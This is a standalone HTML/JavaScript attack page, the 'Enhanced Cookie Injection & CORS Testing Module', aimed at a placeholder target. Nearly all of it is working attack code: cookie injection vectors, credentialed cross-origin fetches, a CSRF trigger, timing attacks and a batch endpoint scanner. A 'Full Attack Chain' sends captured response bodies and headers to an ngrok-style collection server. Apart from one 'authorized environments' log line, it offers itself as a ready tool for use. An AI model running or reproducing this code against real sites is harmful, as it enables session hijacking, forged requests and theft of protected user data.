<!doctype html>
<meta charset="utf-8" />
<title>Enhanced Cookie Injection & CORS Testing Module</title>
<style>
  body { font-family: system-ui, sans-serif; margin: 1rem; background: #0a0e1a; color: #d6ffe6; }
  .section { background: #131823; padding: 16px; margin: 12px 0; border-radius: 8px; border: 1px solid #1e2837; }
  .section h3 { margin-top: 0; color: #6ee7b7; }
  input, button, select, textarea { font-size: 14px; margin: 4px; padding: 8px 12px; background: #1e2837; color: #d6ffe6; border: 1px solid #2d3748; border-radius: 4px; }
  button { cursor: pointer; background: #1e3a5f; transition: all 0.2s; }
  button:hover:not(:disabled) { background: #2563eb; }
  button:disabled { opacity: 0.5; cursor: not-allowed; }
  #out { white-space: pre-wrap; background: #0b1020; color: #d6ffe6; padding: 12px; border-radius: 6px; min-height: 300px; margin-top: 10px; font-family: 'Courier New', monospace; font-size: 13px; max-height: 600px; overflow-y: auto; }
  .row { margin: 8px 0; display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
  label { color: #a5b4fc; }
  .success { color: #6ee7b7; }
  .error { color: #fca5a5; }
  .warning { color: #fcd34d; }
  .status-badge { padding: 2px 6px; border-radius: 4px; font-weight: bold; }
  .status-success { background:#1a7f37; }
  .status-error   { background:#b00020; }
  .status-warning { background:#b45309; }
  .status-info    { background:#1e40af; }
</style>

<h1>Enhanced Cookie Injection & CORS Testing Module</h1>

<!-- Target Config -->
<div class="section">
<h3>Target Configuration</h3>
<div class="row"><label>Target Origin:</label><input id="target" value="https://portal.playground.example.com" size="50"></div>
<div class="row"><label>Target Path:</label><input id="path" value="/api/protected" size="40"></div>
<div class="row"><label>Cookie Name to Inject:</label><input id="cookieName" value="session" size="30"></div>
<div class="row"><label>Cookie Value:</label><input id="cookieValue" value="INJECTED_VALUE" size="40"></div>
</div>

<!-- Server Config -->
<div class="section">
<h3>Server Configuration (ngrok)</h3>
<div class="row"><label>Your ngrok/Server URL:</label><input id="serverUrl" value="http://localhost:3000" size="50"></div>
<div class="row"><label>Evidence endpoint (relative):</label><input id="evidenceEndpoint" value="/collect-evidence" size="30"></div>
<div class="row"><button id="testServer" class="secondary">Test Server Connection</button></div>
<div class="row"><label><input type="checkbox" id="autoExfil" checked /> Auto-send results to server</label></div>
</div>

<!-- Attack Methods -->
<div class="section">
<h3>Attack Methods</h3>
<div class="row">
<button id="basicInjection">Basic Cookie Injection</button>
<button id="advancedInjection">Multi-Vector Injection</button>
<button id="timingAttack">Timing Analysis</button>
</div>
<div class="row">
<button id="csrfTest" class="danger">CSRF Test</button>
<button id="batchTest">Batch Scanner</button>
<button id="proxyFetch">Use Server Proxy (Bypass CORS)</button>
<button id="directCorsTest">Direct CORS Test (credentials)</button>
<button id="automatedExfil">Full Attack Chain</button>
</div>
</div>

<!-- Advanced Options -->
<div class="section">
<h3>Advanced Options</h3>
<div class="row">
<label>HTTP Method:</label>
<select id="method">
<option>GET</option><option selected>POST</option><option>PUT</option><option>PATCH</option><option>DELETE</option>
</select>
</div>
<div class="row">
<label>Request Body (JSON):</label>
<textarea id="body" rows="2" cols="60">{"action": "test", "timestamp": "${Date.now()}"}</textarea>
</div>
<div class="row">
<label><input type="checkbox" id="cleanupCookies" checked /> Cleanup cookies after test</label>
</div>
</div>

<!-- Manual Cookie -->
<div class="section">
<h3>Manual Cookie Management</h3>
<div class="row">
<label>Cookie Name:</label><input id="manualCookieName" value="test_cookie" size="20">
<label>Value:</label><input id="manualCookieValue" value="test_value" size="30">
<button id="setCookieBtn">Set Cookie</button>
<button id="showCookiesBtn" class="secondary">Show All Cookies</button>
</div>
</div>

<!-- Investigator Notes -->
<div class="section">
<h3>Investigator Notes</h3>
<div class="row"><textarea id="notes" rows="4" style="width: 100%; font-family: inherit;" placeholder="Write your observations, findings, timestamps here..."></textarea></div>
<div class="row">
<button id="sendNotes">Send Notes to Server</button>
<button id="clearNotes" class="secondary">Clear Notes</button>
<span id="notesStatus" style="margin-left: 12px;"></span>
</div>
</div>

<!-- Output & Evidence -->
<div class="section">
<h3>Output & Evidence</h3>
<div class="row">
<button id="clearLog" class="secondary">Clear Log</button>
<button id="downloadEvidence">Download Evidence</button>
<button id="copyResults">Copy to Clipboard</button>
<span id="status" style="margin-left: 12px;"></span>
</div>
<div id="out"></div>
</div>

<script>
// ---------------------------------------------------------------------------
// Utility functions
// ---------------------------------------------------------------------------
function getServerUrl() { return document.getElementById('serverUrl').value.trim(); }

function setStatus(msg, type = 'info') {
  const badge = document.createElement('span');
  badge.className = `status-badge status-${type}`;
  badge.textContent = msg;
  const status = document.getElementById('status');
  status.innerHTML = '';
  status.appendChild(badge);
  setTimeout(() => status.innerHTML = '', 5000);
}

function setNotesStatus(msg, error = false) {
  const el = document.getElementById('notesStatus');
  el.textContent = msg;
  el.style.color = error ? '#b00020' : '#1a7f37';
}

function log(msg, level = 'info') {
  const timestamp = new Date().toISOString();
  const prefix = { success:'OK', error:'ERROR', warning:'WARNING', info:'INFO' }[level] || '•';
  const line = `[${timestamp}] ${prefix} ${msg}`;
  const out = document.getElementById('out');
  const span = document.createElement('span');
  span.className = level;
  span.textContent = line + '\n';
  out.appendChild(span);
  out.scrollTop = out.scrollHeight;
}

function hr() { log('─'.repeat(80)); }

function clear() {
  document.getElementById('out').textContent = '';
  logBuffer = [];
  testResults = [];
}

// ---------------------------------------------------------------------------
// Logging buffers
// ---------------------------------------------------------------------------
let logBuffer = [];
let testResults = [];

// ---------------------------------------------------------------------------
// Helper to build config object
// ---------------------------------------------------------------------------
function getConfig(override = {}) {
  const bodyVal = document.getElementById('body').value;
  return {
    target: document.getElementById('target').value.trim(),
    path:   document.getElementById('path').value.trim(),
    cookieName: document.getElementById('cookieName').value.trim(),
    cookieValue: document.getElementById('cookieValue').value.trim(),
    method: document.getElementById('method').value,
    body: bodyVal.includes('${Date.now()}') ? bodyVal.replace('${Date.now()}', Date.now()) : bodyVal,
    cleanup: document.getElementById('cleanupCookies').checked,
    ...override
  };
}

// ---------------------------------------------------------------------------
// SERVER TEST
// ---------------------------------------------------------------------------
document.getElementById('testServer').onclick = async () => {
  const url = getServerUrl();
  try {
    const res = await fetch(url + '/health');
    if (res.ok) {
      const data = await res.json();
      log('Server reachable!', 'success');
      log('Response: ' + JSON.stringify(data), 'info');
      setStatus('Connected', 'success');
    } else {
      log(`Server responded ${res.status}`, 'warning');
      setStatus('Issue', 'warning');
    }
  } catch (e) {
    log(`Cannot reach server: ${e.message}`, 'error');
    setStatus('Not connected', 'error');
  }
};

// ---------------------------------------------------------------------------
// EXFILTRATION TO SERVER
// ---------------------------------------------------------------------------
async function exfiltrateToServer(data) {
  const server = getServerUrl();
  const endpoint = server + document.getElementById('evidenceEndpoint').value;
  log(`Exfiltrating to ${endpoint}`, 'info');

  try {
    const res = await fetch(endpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'cookie_injection_evidence',
        timestamp: new Date().toISOString(),
        data: data,
        metadata: {
          userAgent: navigator.userAgent,
          origin: window.location.origin,
          testCount: testResults.length
        }
      })
    });

    if (res.ok) {
      const json = await res.json();
      log(`Evidence stored (ID: ${json.evidence_id || '—'})`, 'success');
      return true;
    } else {
      const txt = await res.text();
      log(`Server error ${res.status}: ${txt}`, 'error');
      return false;
    }
  } catch (e) {
    log(`Exfil failed: ${e.message}`, 'error');
    return false;
  }
}

// ---------------------------------------------------------------------------
// COOKIE INJECTION ENGINE
// ---------------------------------------------------------------------------
async function cookieInjectionAttack(config) {
  const {
    target, path = '/', cookieName, cookieValue,
    method = 'POST', body = null, timeout = 5000,
    cleanup = true, vectors = ['standard']
  } = config;

  const url = new URL(path, target);
  const domain = url.hostname;
  const targetPath = url.pathname;

  log(`Starting injection on ${url.href}`, 'info');
  log(`Cookie: ${cookieName}=${cookieValue.substring(0,20)}...`);

  const result = {
    target: url.href,
    timestamp: new Date().toISOString(),
    cookieName,
    success: false,
    vectors: [],
    response: null,
    timing: {},
    error: null
  };

  return new Promise((resolve) => {
    const iframe = document.createElement('iframe');
    iframe.src = url.href;
    iframe.style.display = 'none';
    iframe.setAttribute('sandbox', 'allow-same-origin allow-scripts');

    const timeoutId = setTimeout(() => {
      cleanupIframe();
      result.error = 'Timeout';
      log(`Timed out after ${timeout}ms`, 'warning');
      resolve(result);
    }, timeout);

    const cleanupIframe = () => {
      clearTimeout(timeoutId);
      if (iframe.parentNode) document.body.removeChild(iframe);
      if (cleanup) {
        ['=', ';'].forEach(sep => {
          try { document.cookie = `${cookieName}${sep}; domain=${domain}; path=${targetPath}; expires=Thu, 01 Jan 1970 00:00:00 GMT`; } catch (_) {}
        });
      }
    };

    iframe.onload = async () => {
      const start = performance.now();
      try {
        // ---- Injection vectors ----
        const inj = {
          standard: `${cookieName}=${cookieValue}; domain=${domain}; path=${targetPath}`,
          quoted: `${cookieName}="${cookieValue}"; domain=${domain}; path=${targetPath}`,
          version: `$Version=1; ${cookieName}=${cookieValue}; domain=${domain}; path=${targetPath}`,
          dummy: `dummy=qaz"; domain=${domain}; path=/`
        };
        vectors.forEach(v => {
          if (inj[v]) {
            try {
              document.cookie = inj[v];
              result.vectors.push({ name: v, cookie: inj[v], success: true });
              log(`Injected via ${v}`, 'success');
            } catch (e) {
              result.vectors.push({ name: v, success: false, error: e.message });
              log(`Failed ${v}: ${e.message}`, 'error');
            }
          }
        });

        await new Promise(r => setTimeout(r, 100));
        result.timing.injection = performance.now() - start;

        // ---- Request with credentials ----
        const fetchStart = performance.now();
        const opts = {
          method,
          credentials: 'include',
          mode: 'cors',
          headers: { 'Content-Type': 'application/json' }
        };
        if (body && method !== 'GET') opts.body = typeof body === 'string' ? body : JSON.stringify(body);

        const resp = await fetch(url.href, opts);
        result.timing.request = performance.now() - fetchStart;
        result.timing.total = performance.now() - start;

        result.response = {
          status: resp.status,
          statusText: resp.statusText,
          headers: {},
          corsHeaders: {}
        };
        resp.headers.forEach((v, k) => {
          result.response.headers[k] = v;
          if (k.toLowerCase().includes('access-control')) result.response.corsHeaders[k] = v;
        });

        try {
          const ct = resp.headers.get('content-type') || '';
          result.response.body = ct.includes('json') ? await resp.json() : await resp.text();
        } catch (e) { result.response.bodyError = e.message; }

        result.success = true;
        log(`Request ${resp.status} ${resp.statusText}`, 'success');
      } catch (err) {
        result.error = err.message;
        if (err.message.includes('CORS') || err.name === 'TypeError') {
          log('CORS blocked (expected for misconfig demo)', 'warning');
        } else {
          log(`Request error: ${err.message}`, 'error');
        }
      } finally {
        cleanupIframe();
        testResults.push(result);
        resolve(result);
      }
    };

    iframe.onerror = () => {
      cleanupIframe();
      result.error = 'Iframe load failed';
      log('Iframe error', 'error');
      resolve(result);
    };

    document.body.appendChild(iframe);
  });
}

// ---------------------------------------------------------------------------
// TIMING ATTACK
// ---------------------------------------------------------------------------
async function timingAttackAnalysis(config) {
  log('Starting timing analysis...', 'info');
  const runs = 5;
  const results = { authenticated: [], unauthenticated: [] };

  for (let i = 0; i < runs; i++) {
    log(`Auth run ${i+1}/${runs}`);
    const r = await cookieInjectionAttack({ ...config, cleanup: i === runs-1 });
    if (r.timing?.request) results.authenticated.push(r.timing.request);
    await new Promise(r => setTimeout(r, 500));
  }

  for (let i = 0; i < runs; i++) {
    log(`Unauth run ${i+1}/${runs}`);
    const start = performance.now();
    try { await fetch(config.target + config.path, { method: config.method, credentials: 'omit', mode: 'cors' }); } catch (_) {}
    results.unauthenticated.push(performance.now() - start);
    await new Promise(r => setTimeout(r, 500));
  }

  const avg = a => a.reduce((s,v)=>s+v,0)/a.length;
  const std = a => { const m = avg(a); return Math.sqrt(a.reduce((s,v)=>s+Math.pow(v-m,2),0)/a.length); };
  const aAvg = avg(results.authenticated), uAvg = avg(results.unauthenticated);
  const aStd = std(results.authenticated), uStd = std(results.unauthenticated);
  const diff = Math.abs(aAvg - uAvg);
  const sig = diff > (aStd + uStd);

  hr();
  log('TIMING RESULTS', 'success');
  log(`Auth avg: ${aAvg.toFixed(2)}ms (±${aStd.toFixed(2)})`);
  log(`Unauth avg: ${uAvg.toFixed(2)}ms (±${uStd.toFixed(2)})`);
  log(`Diff: ${diff.toFixed(2)}ms  Significant: ${sig?'YES':'NO'}`, sig?'warning':'info');
  hr();

  return { results, aAvg, uAvg, diff, sig };
}

// ---------------------------------------------------------------------------
// BATCH SCANNER
// ---------------------------------------------------------------------------
async function batchEndpointScan(baseTarget, cookieName, cookieValue) {
  const endpoints = [
    '/api/user','/api/profile','/api/account','/api/settings','/api/projects','/api/data',
    '/api/admin','/graphql','/.well-known/security.txt','/v1/me','/v1/users/me'
  ];
  log(`Scanning ${endpoints.length} endpoints...`, 'info');
  const results = [];

  for (const ep of endpoints) {
    log(`Testing ${ep}`);
    const r = await cookieInjectionAttack({
      target: baseTarget, path: ep, cookieName, cookieValue,
      method: 'GET', cleanup: true, timeout: 3000
    });
    results.push({
      endpoint: ep,
      vulnerable: r.success && r.response?.status === 200,
      status: r.response?.status || 'error',
      corsHeaders: r.response?.corsHeaders || {}
    });
    await new Promise(r => setTimeout(r, 300));
  }

  const vul = results.filter(x=>x.vulnerable);
  hr();
  log(`BATCH DONE – ${vul.length}/${results.length} vulnerable`, vul.length?'warning':'success');
  vul.forEach(v => log(`  OK ${v.endpoint} (${v.status})`, 'warning'));
  hr();
  return results;
}

// ---------------------------------------------------------------------------
// EVENT HANDLERS
// ---------------------------------------------------------------------------
document.getElementById('basicInjection').onclick = async () => {
  clear();
  const cfg = getConfig();
  setStatus('Basic injection…', 'info');
  const r = await cookieInjectionAttack(cfg);
  setStatus(r.success?'OK':'Failed', r.success?'success':'error');
  if (document.getElementById('autoExfil').checked) await exfiltrateToServer(r);
};

document.getElementById('advancedInjection').onclick = async () => {
  clear();
  const cfg = getConfig({ vectors: ['standard','quoted','version','dummy'] });
  setStatus('Multi-vector…', 'info');
  const r = await cookieInjectionAttack(cfg);
  setStatus(r.success?'OK':'Failed', r.success?'success':'error');
  if (document.getElementById('autoExfil').checked) await exfiltrateToServer(r);
};

document.getElementById('timingAttack').onclick = async () => {
  clear();
  const cfg = getConfig({ method:'GET' });
  setStatus('Timing analysis…', 'info');
  const r = await timingAttackAnalysis(cfg);
  setStatus('Done', 'success');
  if (document.getElementById('autoExfil').checked) await exfiltrateToServer(r);
};

document.getElementById('batchTest').onclick = async () => {
  clear();
  const base = document.getElementById('target').value.trim();
  const cn = document.getElementById('cookieName').value.trim();
  const cv = document.getElementById('cookieValue').value.trim();
  setStatus('Batch scan…', 'info');
  const r = await batchEndpointScan(base, cn, cv);
  const vul = r.filter(x=>x.vulnerable).length;
  setStatus(`${vul} vulnerable`, vul?'warning':'success');
  if (document.getElementById('autoExfil').checked) await exfiltrateToServer(r);
};

document.getElementById('csrfTest').onclick = async () => {
  clear();
  log('CSRF test (state-changing)…', 'warning');
  const cfg = getConfig({
    method: document.getElementById('method').value,
    body: JSON.stringify({action:'csrf_test', ts:Date.now(), id:crypto.randomUUID?.()||Math.random().toString(36).substr(2,9)})
  });
  setStatus('CSRF test…', 'warning');
  const r = await cookieInjectionAttack(cfg);
  if (r.success && r.response?.status < 300) {
    log('CSRF succeeded – critical!', 'error');
    setStatus('CSRF possible', 'error');
  } else {
    log('CSRF blocked', 'info');
    setStatus('CSRF blocked', 'success');
  }
  if (document.getElementById('autoExfil').checked) await exfiltrateToServer(r);
};

document.getElementById('automatedExfil').onclick = async () => {
  clear();
  const cfg = getConfig({ method:'GET' });
  setStatus('Full chain…', 'warning');
  const r = await cookieInjectionAttack(cfg);
  const ok = await exfiltrateToServer(r);
  setStatus(ok?'Exfiltrated':'Failed', ok?'success':'error');
};

document.getElementById('proxyFetch').onclick = async () => {
  clear();
  const server = getServerUrl();
  const target = document.getElementById('target').value.trim() + document.getElementById('path').value.trim();
  const payload = { targetUrl: target, method: document.getElementById('method').value };
  log(`Proxy fetch to ${target}`, 'info');
  try {
    const res = await fetch(server + '/proxy-fetch', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify(payload)
    });
    const data = await res.json();
    if (data.ok) {
      log('Proxy response OK', 'success');
      log(JSON.stringify(data.data, null, 2).slice(0,1500));
      if (document.getElementById('autoExfil').checked) await exfiltrateToServer(data.data);
    } else {
      log(`Proxy error: ${data.error}`, 'error');
    }
  } catch (e) {
    log(`Proxy failed: ${e.message}`, 'error');
  }
};

document.getElementById('directCorsTest').onclick = async () => {
  clear();
  const url = document.getElementById('target').value.trim() + document.getElementById('path').value.trim();
  log(`Direct credentialed fetch to ${url}`, 'info');
  try {
    const r = await fetch(url, { method:'GET', credentials:'include', mode:'cors' });
    const txt = await r.text();
    log(`Status ${r.status}`, r.ok?'success':'warning');
    log(txt.slice(0,800));
    if (document.getElementById('autoExfil').checked) await exfiltrateToServer({url, status:r.status, body:txt});
  } catch (e) {
    log(`CORS blocked (expected): ${e.message}`, 'warning');
  }
};

document.getElementById('clearLog').onclick = clear;

document.getElementById('downloadEvidence').onclick = () => {
  const payload = {
    timestamp: new Date().toISOString(),
    logs: logBuffer,
    results: testResults,
    metadata: { userAgent: navigator.userAgent, origin: window.location.origin }
  };
  const blob = new Blob([JSON.stringify(payload, null, 2)], {type:'application/json'});
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = `evidence-${Date.now()}.json`;
  a.click();
  URL.revokeObjectURL(a.href);
  setStatus('Downloaded', 'success');
};

document.getElementById('copyResults').onclick = () => {
  navigator.clipboard.writeText(logBuffer.join('\n')).then(() => setStatus('Copied','success')).catch(() => setStatus('Copy failed','error'));
};

// ---------------------------------------------------------------------------
// MANUAL COOKIE & NOTES
// ---------------------------------------------------------------------------
document.getElementById('setCookieBtn').onclick = () => {
  const name = document.getElementById('manualCookieName').value.trim();
  const val  = document.getElementById('manualCookieValue').value.trim();
  document.cookie = `${name}=${val}; path=/`;
  log(`Set cookie ${name}=${val}`, 'info');
};

document.getElementById('showCookiesBtn').onclick = () => {
  log('Current cookies:', 'info');
  log(document.cookie || '(none)', 'info');
};

document.getElementById('sendNotes').onclick = async () => {
  const raw = document.getElementById('notes').value.trim();
  if (!raw) { setNotesStatus('Empty notes', true); return; }
  const payload = {
    notes: raw.slice(0,20000),
    target: document.getElementById('target').value || location.href,
    timestamp: new Date().toISOString(),
    user_agent: navigator.userAgent
  };
  const btn = document.getElementById('sendNotes');
  btn.disabled = true; btn.textContent = 'Sending…';
  try {
    const res = await fetch(getServerUrl() + '/notes', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify(payload)
    });
    if (!res.ok) throw new Error(`${res.status}`);
    setNotesStatus('Sent OK ' + new Date().toISOString());
  } catch (e) {
    setNotesStatus('Failed – saved locally', true);
    try { localStorage.setItem('notes_'+Date.now(), JSON.stringify(payload)); } catch (_) {}
  } finally {
    btn.disabled = false; btn.textContent = 'Send Notes to Server';
  }
};

document.getElementById('clearNotes').onclick = () => {
  if (confirm('Clear notes?')) {
    document.getElementById('notes').value = '';
    setNotesStatus('Cleared');
  }
};

// ---------------------------------------------------------------------------
// INIT
// ---------------------------------------------------------------------------
log('Enhanced Cookie Injection Module loaded', 'success');
log('Ready – use only in authorized environments', 'warning');
hr();
</script>
